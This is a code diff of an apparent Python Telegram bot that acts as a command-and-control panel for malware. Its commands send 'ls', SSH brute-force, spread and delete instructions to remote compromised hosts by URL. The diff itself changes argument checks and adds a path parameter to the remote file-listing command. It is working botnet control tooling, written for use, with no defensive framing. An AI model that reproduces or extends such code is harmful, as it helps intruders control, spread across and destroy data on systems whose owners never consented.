@@ -26,15 +26,15 @@ def ls(update,context):
 
 	if not authorized(update.message.chat_id):return
 
-	if len(context.args) > 1 or len(context.args) == 0:
-		update.message.reply_text("Usage: /ls <URL> , one and only one argument is required")
+	if len(context.args) != 2:
+		update.message.reply_text("Usage: /ls <URL> <PATH>,only two arguments are required")
 		return
 		
 	if not validators.url(context.args[0]):
 		update.message.reply_text("Given argument is not an URL")
 		return
 	
-	request = requests.post(context.args[0],data="ls")
+	request = requests.post(context.args[0],data="ls&"+context.args[1])
 	if request.status_code == 200:
 		update.message.reply_text(request.text)
 	else:
@@ -45,7 +45,7 @@ def ssh_brute_force(update,context):
 
 	if not authorized(update.message.chat_id):return
 
-	if len(context.args) > 1 or len(context.args) == 0:
+	if len(context.args) != 1:
 		update.message.reply_text("Usage: /ssh_brute_force <URL> , one and only one argument is required")
 		return
 		
@@ -64,7 +64,7 @@ def spread(update,context):
 
 	if not authorized(update.message.chat_id):return
 
-	if len(context.args) > 1 or len(context.args) == 0:
+	if len(context.args) != 1:
 		update.message.reply_text("Usage: /spread <URL> , one and only one argument is required")
 		return
 		
@@ -83,7 +83,7 @@ def delete(update,context):
 	
 	if not authorized(update.message.chat_id):return
 	
-	if len(context.args) > 1 or len(context.args) == 0:
+	if len(context.args) != 1:
 		update.message.reply_text("Usage: /delete <URL> , one and only one argument is required")
 		return
 	
